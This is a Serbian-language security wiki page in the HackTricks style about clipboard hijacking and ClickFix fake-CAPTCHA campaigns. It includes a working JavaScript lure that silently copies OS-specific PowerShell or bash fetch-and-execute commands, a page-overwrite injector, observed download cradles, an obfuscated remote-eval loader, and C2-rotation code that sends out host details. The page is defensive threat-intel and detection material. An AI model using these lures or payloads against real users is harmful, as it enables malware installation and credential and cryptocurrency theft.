# Clipboard Hijacking (Pastejacking) napadi

{{#include ../../banners/hacktricks-training.md}}

> „Nikada ne lepite ništa što sami niste kopirali.” – stari, ali i dalje važeći savet

## Pregled

Clipboard hijacking – poznat i kao *pastejacking* – zloupotrebljava činjenicu da korisnici redovno kopiraju i lepe komande, a da ih prethodno ne pregledaju. Zlonamerna veb-stranica (ili bilo koje okruženje koje podržava JavaScript, kao što je Electron ili desktop aplikacija) programski ubacuje tekst koji kontroliše napadač u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim uputstvima za socijalni inženjering, da pritisnu **Win + R** (dijalog Run), **Win + X** (Quick Access / PowerShell) ili otvore terminal i *nalepe* sadržaj iz clipboarda, čime odmah izvršavaju proizvoljne komande.

Pošto **se ne preuzima nijedna datoteka i ne otvara nijedan prilog**, ova tehnika zaobilazi većinu bezbednosnih kontrola za e-poštu i veb-sadržaj koje nadgledaju priloge, makroe ili direktno izvršavanje komandi. Zbog toga je ovaj napad popularan u phishing kampanjama koje isporučuju uobičajene porodice malware-a, kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>

## Malware za zamenu adresa novčanika

Druga varijanta **clipboard hijackinga** uopšte ne lepi komande: čeka da žrtva kopira **adresu novčanika za kriptovalute**, a zatim je neprimetno zameni adresom koju kontroliše napadač neposredno pre lepljenja. Ovo je naročito efikasno kod dugih formata adresa novčanika jer korisnici često proveravaju samo početne i završne znakove.<sup>[[8]](#references)</sup>

Uobičajene karakteristike iz stvarnog sveta:
- **Tanki loader + ugnježdeni payload**: aplikacija/exe koja se vidi izgleda kao legitimni alat za trgovanje ili „profit”, dok je pravi clipper sakriven dublje u paketu (na primer, .NET loader pokreće ugnježdeni Rust payload).
- **Zamena zasnovana na regex-u**: malware prepoznaje stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ili čak generičke stringove nalik Solana adresama od **44 znaka**, pa ih zamenjuje adresama novčanika napadača.
- **Rotacija novčanika u velikom obimu**: moderni Windows uzorci mogu da sadrže **hiljade** zamenskih adresa novčanika za svaku valutu, umesto jedne statične adrese, čime se smanjuje narušavanje reputacije novčanika nakon svake krađe.<sup>[[8]](#references)</sup>

### Tok rada Windows clippera

Uobičajena implementacija koristi skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Pri svakom ažuriranju clipboarda, malware obično poziva:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → pristup trenutnim podacima u clipboardu.
- **`GetClipboardData`** → čitanje teksta.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamena stringa adrese novčanika vrednošću napadača.

Minimalni regex-i za lov na malware, koji se često sreću u clipperima:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Korisnički nivo persistence-a dovoljan je za ostvarivanje uticaja. Jedan uočeni obrazac je:<sup>[[8]](#references)</sup>
- Kopira payload u **`%APPDATA%\silke\silke.exe`**
- Kreira **LNK u Startup folderu** u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard API-je, a istovremeno zapisuju u `%APPDATA%` i korisnički **Startup** folder.
- Kreiranje novog LNK-a/izvršne datoteke praćeno zamenama adrese wallet-a u clipboard-u.
- Arhive ili paketi lažnog softvera koji sadrže mnogo neiskorišćenih datoteka i mali launcher koji pokreće ugnježdeni binarni fajl.

### Uklanjanje karantine socijalnim inženjeringom + LaunchAgent persistence u macOS

U macOS-у, neke kampanje isporučuju pomoćni fajl **`unlocker.command`** i upućuju žrtvu da klikne desnim tasterom miša → **Otvori** ako Gatekeeper prijavi da je aplikacija oštećena ili od neidentifikovanog developera. Skripta samo uklanja karantinu i pokreće obližnji `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Ovo **nije** Gatekeeper exploit; ovo je **zaobilaženje karantina pomoću socijalnog inženjeringa** koje iskorišćava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr-a.<sup>[[8]](#references)</sup>

Nakon izvršavanja, clipper može da opstane pod trenutnim korisnikom tako što upiše:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – omotačka skripta
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Korisno je znati da neki uzorci imaju **watchdog sa samooporavkom** koji ponovo upisuje LaunchAgent i omotačku skriptu na svakih ~30 sekundi. Ako prvo uklonite plist, a **ne ugasite pokrenuti proces**, malware može odmah ponovo da ga napravi.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
1. Ugasite aktivni clipper proces.
2. Otpustite/obrišite LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o isporuci: lažni ugled kao multiplikator efekta

Kod ove porodice, sam malware može da ostane tehnički jednostavan, dok **sloj distribucije** obavlja glavni posao: lažne GitHub zvezdice/račvanja, SourceForge recenzije/preuzimanja, komentari/pregledi YouTube tutorijala i naizgled bezazleni VirusTotal komentari/glasovi služe da binary deluje pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>

## Nametnuta dugmad za kopiranje i skriveni payload-i (macOS jednolinijske komande)

Neki macOS infostealer-i kloniraju instalacione sajtove (npr. Homebrew) i **primoravaju korisnike da koriste dugme „Copy“**, tako da ne mogu da označe samo vidljivi tekst. Stavka iz clipboard-a sadrži očekivanu instalacionu komandu i dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), pa jedno lepljenje izvršava oba, dok interfejs skriva dodatnu fazu.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Starije kampanje koristile su `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Tok ClickFix / ClearFake

1. Korisnik posećuje typosquatted ili kompromitovanu lokaciju (npr. `docusign.sa[.]com`)
2. Ubrizgani **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja neprimetno čuva Base64-kodiranu PowerShell jednolinijsku komandu u clipboardu.
3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.”*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitimnu izvršnu datoteku i zlonamerni DLL (klasični DLL sideloading).
5. Loader dešifruje dodatne faze, ubacuje shellcode i instalira postojanost (npr. scheduled task) – na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Primer lanca NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dve binarne datoteke (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dešifruje ih pomoću rotirajućeg XOR ključa `"https://google.com/"`, ubacuje konačni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Preuzima `la.txt` pomoću **curl.exe**
2. Pokreće JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i spajanja fajlova, a zatim pokreće `.a3x` skript koji eksfiltrira akreditive iz pregledača na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Ostava → PowerShell → JS eval → LNK pri pokretanju sa rotirajućim C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanje fajlova i umesto toga upućuju žrtve da nalepe jednolinijsku komandu koja preuzima i izvršava JavaScript putem WSH-a, obezbeđuje njegovu postojanost i svakodnevno rotira C2. Primer uočенog lanca:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Ključne karakteristike
- Obfuskovani URL se obrće tokom izvršavanja kako bi se izbegla površna inspekcija.
- JavaScript obezbeđuje svoju postojanost putem Startup LNK-a (WScript/CScript) i bira C2 na osnovu tekućeg dana – što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>

Minimalni JS fragment koji se koristi za rotaciju C2 adresa prema datumu:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često vezujući TLS za hardkodovani sertifikat i deleći saobraćaj na delove.<sup>[[3]](#references)</sup>

Ideje za detekciju specifične za ovu varijantu
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Artefakti pri pokretanju: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji pokreće WScript/CScript sa putanjom JS datoteke pod `%TEMP%`/`%APPDATA%`.
- Telemetrija registra/RunMRU i komandne linije koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponovljeno pokretanje `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin sadržajima za prosleđivanje dugih skripti bez dugačkih komandnih linija.
- Zakazani zadaci koji potom izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` preko zadatka/putanje koja liči na program za ažuriranje (npr. `\GoogleSystem\GoogleUpdater`).

Lov na pretnje
- C2 nazivi hostova koji se menjaju svakog dana i URL-ovi obrasca `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Povežite događaje upisa u clipboard sa naknadnim lepljenjem preko Win+R i trenutnim izvršavanjem `powershell.exe`.

Blue-teams mogu da kombinuju telemetriju međuspremnika, kreiranja procesa i registra kako bi precizno otkrili zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju komandi **Win + R** – potražite neobične Base64 / obfuskirane stavke.
* Security Event ID **4688** (kreiranje procesa) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` jedan od { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje datoteka pod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim fasciklama neposredno pre sumnjivog događaja 4688.
* EDR senzori međuspremnika (ako postoje) – povežite `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.

## Stranice za verifikaciju u stilu IUAM (ClickFix Generator): kopiranje iz međuspremnika u konzolu + payload-i prilagođeni operativnom sistemu

Nedavne kampanje masovno generišu lažne stranice za verifikaciju CDN-a/pregledača („Just a moment…“, u stilu IUAM-a) koje navode korisnike da kopiraju komande prilagođene operativnom sistemu iz međuspremnika u izvorne konzole. Time se izvršavanje premešta izvan sandbox-a pregledača, a pristup funkcioniše i na Windows-u i macOS-u.<sup>[[4]](#references)</sup>

Ključne osobine stranica generisanih pomoću builder-a
- Otkrivanje operativnog sistema preko `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal). Opcioni mamci/no-op komande za nepodržane operativne sisteme održavaju privid.
- Automatsko kopiranje u međuspremnik pri bezazlenim radnjama u UI-ju (potvrdni okvir/Copy), dok vidljivi tekst može da se razlikuje od sadržaja međuspremnika.
- Blokiranje mobilnih uređaja i iskačući prozor sa detaljnim uputstvima: Windows → Win+R→nalepi→Enter; macOS → otvori Terminal→nalepi→Enter.
- Opciona obfuskacija i injector u jednoj datoteci koji prepisuje DOM kompromitovanog sajta UI-jem za verifikaciju stilizovanim pomoću Tailwind-a (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>

Primer: nepodudaranje sadržaja međuspremnika + grananje prilagođeno operativnom sistemu
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Postojanost početnog pokretanja na macOS-u
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` da bi se izvršavanje nastavilo nakon zatvaranja terminala, čime se smanjuje broj vidljivih tragova.<sup>[[4]](#references)</sup>

Preuzimanje stranice na kompromitovanim sajtovima
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ideje za detekciju i threat hunting specifične za IUAM mamce
- Web: Stranice koje povezuju Clipboard API sa widgetima za verifikaciju; neslaganje između prikazanog teksta i sadržaja clipboard-a; grananje na osnovu `navigator.userAgent`; Tailwind + zamena sadržaja single-page stranice u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browser-om; batch/MSI instaleri pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; pozadinski procesi koji nastavljaju da rade nakon zatvaranja terminala.
- Povežite istoriju `RunMRU` Win+R i upise u clipboard sa naknadnim kreiranjem konzolnih procesa.

Pogledajte i prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evolucije lažnih CAPTCHA / ClickFix napada iz 2026. (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i ubacuje JavaScript loader-e koji povezuju spoljne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i pozive blockchain „etherhiding“ (npr. POST zahteve ka Binance Smart Chain API endpoint-ima kao što je `bsc-testnet.drpc[.]org`), kako bi preuzeli aktuelnu logiku mamaca. Noviji overlay-i u velikoj meri koriste lažne CAPTCHA provere koje upućuju korisnike da kopiraju/lepe jednu liniju komande (T1204.004), umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
- Početno izvršavanje sve češće se prepušta potpisanim script host-ovima/LOLBAS alatima. U lancima napada iz januara 2026. ranija upotreba `mshta` zamenjena je ugrađenim `SyncAppvPublishingServer.vbs`, pokrenutim preko `WScript.exe` sa argumentima nalik PowerShell-u, koji koriste alias-e/zamenske znakove za preuzimanje udaljenog sadržaja:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` je potpisan i obično se koristi uz App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (aliasi `gal`/`gcm`, cmdlet-i sa džoker znakovima, URL-ovi jsDelivr) postaje visokosignalna LOLBAS faza za ClearFake.<sup>[[6]](#references)</sup>
- Lažni CAPTCHA payload-i iz februara 2026. ponovo su prešli na čiste PowerShell download cradles. Dva aktivna primera:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Prvi lanac je grabber `iex(irm ...)` koji radi u memoriji; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, a zatim ga pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>

Saveti za detekciju i threat hunting za ove varijante
- Poreklo procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles neposredno nakon upisa u clipboard/Win+R.
- Ključne reči komandne linije: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni ili obrasci sa sirovom IP adresom `iex(irm ...)`.
- Mreža: odlazne konekcije ka CDN worker hostovima ili blockchain RPC endpointima iz script hostova/PowerShell-a neposredno nakon pregledanja veba.
- Fajlovi/registar: kreiranje privremenog `.ps1` fajla u `%TEMP%` i RunMRU stavke koje sadrže ove jednolinijske komande; blokirajte/upozoravajte na izvršavanje potpisanih skripti preko LOLBAS-a (WScript/cscript/mshta) sa spoljnim URL-ovima ili obfuskiranim alias stringovima.

## ClickFix tradecraft iz juna 2026: telemetrija nalepljivanja, lažni komentari za verifikaciju i ulančavanje LOLBin-ova

Nedavna telemetrija Red Canary-ja pokazuje da stabilan indikator **nije jedna konkretna komanda**, već kombinacija **nalepljivanja i pokretanja uz pomoć korisnika**, **pouzdanih interpretera/LOLBIN-ova**, **obfuskiranih zastavica**, **udaljenog preuzimanja** i **neposrednog izvršavanja**.<sup>[[7]](#references)</sup>

### Uočljivi obrasci operatora

- **Telemetrija potvrde nalepljivanja**: neki payload-i pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre stvarne faze. Time se potvrđuje interakcija korisnika, uz kratak i neupadljiv prozor.
- **Lažni komentari za verifikaciju**: PowerShell jednolinijske komande mogu da dodaju stringove kao što je `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon nalepljivanja i dalje izgleda povezano sa CAPTCHA-om u Run / `cmd.exe` / PowerShell istoriji.
- **Dinamičko rekonstruisanje URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava statički URL u komandnoj liniji, a ipak preuzima sadržaj i izvršava ga u memoriji.
- **Izvršavanje maskiranog instalacionog programa**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neobično pisanje velikih i malih slova i znakove nalik Unicode-u u zastavicama kako bi zaobišlo krhke detekcije, a i dalje ličilo na `msiexec.exe`.
- **Lanci LOLBin-ova sa escape-ovanjem pomoću znaka caret**: `cmd.exe` može da sakrije ključne reči pomoću escape-ovanja znakom `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrene ugnježdenu ljusku minimizovanu, sačuva napadačev sadržaj sa bezazlenom ekstenzijom kao što je `.pdf`, a zatim ga izvrši preko `mshta`.<sup>[[7]](#references)</sup>
## Mere ublažavanja

1. Ojačavanje browser-a – onemogućite upis u clipboard (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevajte korisnički gest.
2. Bezbednosna svest – naučite korisnike da *ukucaju* osetljive komande ili da ih prvo nalepe u uređivač teksta.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih jednolinijskih komandi.
4. Mrežne kontrole – blokirajte odlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezane tehnike

* **Otmiца Discord pozivnica** često zloupotrebljava isti ClickFix pristup nakon što namami korisnike na zlonamerni server:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Ispravite klik: sprečavanje ClickFix vektora napada](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Iza čiste zavese: od RAT-a do builder-a do programera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix fabrika: prvo otkrivanje IUAM ClickFix generatora](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Uvidi u obaveštajne podatke: februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Uvidi u obaveštajne podatke: jun 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Od zvezdica do glasova: lažna reputacija podstiče kradljivca kripto-valuta iz clipboard-a](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
